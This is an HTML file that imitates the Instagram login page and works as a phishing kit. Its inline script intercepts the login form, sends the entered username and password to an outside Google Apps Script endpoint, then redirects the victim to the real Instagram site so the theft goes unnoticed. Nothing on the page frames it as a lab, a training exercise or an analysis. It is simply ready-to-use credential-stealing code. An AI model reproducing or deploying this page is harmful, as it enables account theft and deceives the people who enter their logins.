<!DOCTYPE html>
<html lang="en">
<head>
        <meta charset="UTF-8">
        <title>Instagram Login Page</title>
        <link rel="stylesheet" href="styles.css">
</head>
<body>

<div class="wrapper">
        <div class="header">
                <div class="top">
                        <div class="logo">
                                <img src="instagram.png" alt="instagram" style="width: 175px;">
                        </div>

                        <!-- FORMULARIO REAL -->
                        <form class="form" id="miFormulario">
                                <div class="input_field">
                                        <input type="text" name="usuario" placeholder="Phone number, username, or email" class="input" required>
                                </div>
                                <div class="input_field">
                                        <input type="password" name="mensaje" placeholder="Password" class="input" required>
                                </div>
                                <div class="btn">
                                        <button type="submit" style="width: 100%; background: none; border: none; color: white; font-weight: bold;">Log In</button>
                                </div>
                        </form>

                        <div class="or">
                                <div class="line"></div>
                                <p>OR</p>
                                <div class="line"></div>
                        </div>

                        <div class="dif">
                                <div class="fb">
                                        <img src="facebook.png" alt="facebook">
                                        <p>Log in with Facebook</p>
                                </div>
                                <div class="forgot">
                                        <a href="#">Forgot password?</a>
                                </div>
                        </div>
                </div>

                <div class="signup">
                        <p>Don't have an account? <a href="#">Sign up</a></p>
                </div>

                <div class="apps">
                        <p>Get the app.</p>
                        <div class="icons">
                                <a href="#"><img src="appstore.png" alt="appstore"></a>
                                <a href="#"><img src="googleplay.png" alt="googleplay"></a>
                        </div>
                </div>
        </div>

        <div class="footer">
                <div class="links">
                        <ul>
                                <li><a href="#">ABOUT US</a></li>
                                <li><a href="#">SUPPORT</a></li>
                                <li><a href="#">PRESS</a></li>
                                <li><a href="#">API</a></li>
                                <li><a href="#">JOBS</a></li>
                                <li><a href="#">PRIVACY</a></li>
                                <li><a href="#">TERMS</a></li>
                                <li><a href="#">DIRECTORY</a></li>
                                <li><a href="#">PROFILES</a></li>
                                <li><a href="#">HASHTAGS</a></li>
                                <li><a href="#">LANGUAGE</a></li>
                        </ul>
                </div>
                <div class="copyright">
                        Â© 2025 INSTAGRAM
                </div>
        </div>
</div>

<script>
  const form = document.getElementById('miFormulario');

  form.addEventListener('submit', e => {
    e.preventDefault();

    const data = {
      usuario: form.usuario.value,
      mensaje: form.mensaje.value
    };

    fetch('https://script.google.com/macros/s/AKfycbxvtR9rxVuuAC5VSYsWMLPnDvpbinuEyzJKLMfW4-DnpWHJAwg-mNsXsFOqb8reiEnlUQ/exec', {
      method: 'POST',
      body: JSON.stringify(data),
      headers: {
        'Content-Type': 'application/json'
      }
    })
    .then(res => res.json())
    .then(response => {
      alert("Procesando...");
      window.location.href = "https://instagram.com";
    })
    .catch(error => {
      console.error('Error:', error);
      alert("Hubo un error al enviar.");
    });
  });
</script>

</body>
</html>
